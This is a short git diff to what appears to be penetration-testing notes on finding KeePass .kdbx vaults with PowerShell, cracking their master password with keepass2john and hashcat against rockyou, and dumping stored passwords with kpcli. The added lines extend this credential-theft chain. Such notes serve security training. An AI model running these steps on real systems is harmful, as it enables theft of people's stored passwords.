@@ -11,7 +11,9 @@ if the user uses a manager like keypass we can do a search to see what extension
 
 then use powershell to search for it
 
-    $ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+    PS> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+    PS> Get-ChildItem -Path "C:\Users\jim" -Filter *.kdbx -r | % { $_.Name.Replace( ".kdbx","") }
 
 we can use john the ripper's keeppass2john script to format the database
 
@@ -28,3 +30,13 @@ displays 13400 for keepass
 and finally crack it
 
     $ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+
+now we use kpcli to view Databse contents
+
+    $ kpcli --kdb=Database.kdbx
+
+enter password from Database.kdx crack
+    
+and to show passwords
+
+    $ show 1 -f
